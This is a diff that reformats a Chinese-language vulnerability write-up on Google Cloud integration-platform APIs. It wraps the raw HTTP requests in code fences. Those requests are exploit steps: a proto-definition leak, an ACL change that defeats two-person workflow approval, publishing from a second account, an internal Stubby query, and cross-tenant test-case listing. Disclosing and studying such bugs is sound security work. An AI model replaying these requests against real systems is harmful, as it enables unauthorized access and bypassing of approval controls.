@@ -99,17 +99,22 @@ req2proto as a Service™：proto 定义泄露
 ●  
 请求 · getProtoDefinition  
   
+
+```http
 GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
   
-Cookie: `<redacted>`  
+Cookie: <redacted>  
   
-Authorization: SAPISIDHASH `<redacted>`  
+Authorization: SAPISIDHASH <redacted>  
   
 Origin: https://console.cloud.google.com  
   
 X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE  
+```
+
+
   
 关于这里的认证  
   
@@ -241,19 +246,24 @@ Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.
 ●  
 请求 · listQuotaQueue  
   
+
+```http
 GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
   
-Cookie: `<redacted>`  
+Cookie: <redacted>  
   
-Authorization: SAPISIDHASH `<redacted>`  
+Authorization: SAPISIDHASH <redacted>  
   
 Origin: https://console.cloud.google.com  
   
 X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE  
   
 X-Goog-Encode-Response-If-Executable: base64  
+```
+
+
   
 API 返回了一大段 base64 的 protobuf。  
   
@@ -592,13 +602,15 @@ permission_to_check 则告诉后端，最终解析出来的身份需要对什么
 ●  
 请求 · createDraftWorkflow  
   
+
+```http
 POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
   
-Cookie: `<redacted>`  
+Cookie: <redacted>  
   
-Authorization: SAPISIDHASH `<redacted>`  
+Authorization: SAPISIDHASH <redacted>  
   
 Origin: https://console.cloud.google.com  
   
@@ -626,6 +638,9 @@ Content-Length: 197
 　"isNewWorkflow": true  
   
 }  
+```
+
+
   
 ●  
 ●  
@@ -657,6 +672,7 @@ Content-Length: 197
 ●  
 请求 · createDraftWorkflow（带上 clientId）  
   
+```http
 POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
@@ -683,6 +699,8 @@ Content-Type: application/json
 　"isNewWorkflow": true  
   
 }  
+```
+
   
 ●  
 ●  
@@ -724,6 +742,7 @@ Content-Type: application/json
 ●  
 请求 · publishWorkflow  
   
+```http
 POST /v1/integrationPlatform:publishWorkflow HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
@@ -736,6 +755,8 @@ Content-Type: application/json
 　"workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e"  
   
 }  
+```
+
   
 ●  
 ●  
@@ -1068,6 +1089,8 @@ shrugged 想出了绕法——把 IP_EVENTBUS_WORKFLOWS 的 ACL 更新成两个�
 ●  
 请求 · setAcl  
   
+
+```http
 POST /v1/integrationPlatform/auth:setAcl HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
@@ -1086,6 +1109,8 @@ Content-Length: 500
 　　{"scope": {"obfuscatedGaiaId": "100029910836469267942"}, "role": 105},  
   
 　　{"scope": {"obfuscatedGaiaId": "113728935872649341310"}, "role": 105}]}}  
+```
+
   
 ●  
 ●  
@@ -1106,6 +1131,7 @@ Content-Type: application/json; charset=UTF-8
 ●  
 请求 · toggleRequestToPublishWorkflow  
   
+```http
 POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
@@ -1114,6 +1140,8 @@ Content-Type: application/json
   
   
 {"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}  
+```
+
   
 再用第二个账号真正发布工作流——两人审批就此失效：  
   
@@ -1122,6 +1150,7 @@ Content-Type: application/json
 ●  
 请求 · publishWorkflow（第二个账号）  
   
+```http
 POST /v1/integrationPlatform/workflowdeployment:publishWorkflow HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
@@ -1130,6 +1159,8 @@ Content-Type: application/json
   
   
 {"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}  
+```
+
   
 运行一个配置了 GenericStubbyTypedTaskV2 的工作流，serverSpec 设为 gslb:alkali-base、服务和方法设为 /ServerStatus.GetServices，我们就执行了 Stubby 查询：  
   
@@ -1262,6 +1293,8 @@ API 会开开心心地把受害者的资源返回给你——因为认证检查�
 ●  
 请求 · ListTestCases  
   
+
+```http
 POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2  
   
 Host: us-central1-integrations.clients6.google.com  
@@ -1270,6 +1303,8 @@ Content-Type: application/x-protobuf
   
   
 < RAW PROTOBUF DATA >  
+```
+
   
 真正的请求体是 protobuf，我把它解码出来是这样的：  
   
@@ -1595,11 +1630,13 @@ Authorization: Bearer `<redacted>`
 ●  
 请求 · 创建带 PythonTask 的集成版本  
   
+
+```http
 POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2  
   
 Host: integrations.googleapis.com  
   
-Authorization: Bearer `<redacted>`  
+Authorization: Bearer <redacted>  
   
 Content-Length: 1033  
   
@@ -1645,6 +1682,9 @@ Content-Length: 1033
 　...  
   
 }  
+```
+
+
   
 ●  
 ●  
@@ -1766,7 +1806,7 @@ com.google.enterprise.crm.exceptions.IpCanonicalCodeException:
   
 　com.google.net.rpc3.client.RpcClientException:  
   
-　<eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/> APPLICATION_ERROR;  
+　`<eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/>` APPLICATION_ERROR;  
   
 　enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;  
   
